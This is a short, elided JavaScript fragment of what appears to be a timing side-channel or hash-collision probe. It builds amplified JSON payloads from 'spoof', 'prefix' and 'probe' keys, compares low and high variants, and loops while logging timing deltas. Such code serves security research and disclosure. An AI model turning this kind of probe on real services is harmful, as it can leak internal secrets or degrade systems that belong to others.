...
function genJSON(spoof, prefix, probe) {
  let r = '[' +
      spoof.map(spoofKey => `{${JSON.stringify(spoofKey)}:0}`).join(',');
  for (let i = 0; i < AMPLIFICATION; i++)
    r += ',{' + prefix.join(',') + ',' +JSON.stringify(probe) + ':0}';
  return r + ']';
}
...
const jLow = genJSON(spoof, prefix, low);
const jHigh = genJSON(spoof, prefix, high);
...
for (;;) {
  ...
  console.log('delta=%d hdev=%d ldev=%d count=%d',
